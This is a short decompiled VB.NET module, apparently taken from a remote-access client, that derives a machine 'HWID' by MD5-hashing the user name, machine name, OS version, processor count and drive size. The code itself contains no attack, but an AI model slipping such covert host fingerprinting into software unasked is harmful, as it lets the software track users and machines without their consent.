Imports System
Imports System.IO
Imports System.Security.Cryptography
Imports System.Text

Namespace Client.Helper
	' Token: 0x02000011 RID: 17
	Public Module HwidGen
		' Token: 0x06000053 RID: 83 RVA: 0x00003D54 File Offset: 0x00001F54
		Public Function HWID() As String
			Dim text2 As String
			Try
				Dim text As String = String.Concat(New Object() { Environment.ProcessorCount, Environment.UserName, Environment.MachineName, Environment.OSVersion, New DriveInfo(Path.GetPathRoot(Environment.SystemDirectory)).TotalSize })
				Dim hashAlgorithm As HashAlgorithm = New MD5CryptoServiceProvider()
				Dim array As Byte() = Encoding.ASCII.GetBytes(text)
				array = hashAlgorithm.ComputeHash(array)
				Dim stringBuilder As StringBuilder = New StringBuilder()
				For Each b As Byte In array
					stringBuilder.Append(b.ToString("x2"))
				Next
				text2 = stringBuilder.ToString().Substring(0, 20).ToUpper()
			Catch
				text2 = "Err HWID"
			End Try
			Return text2
		End Function
	End Module
End Namespace
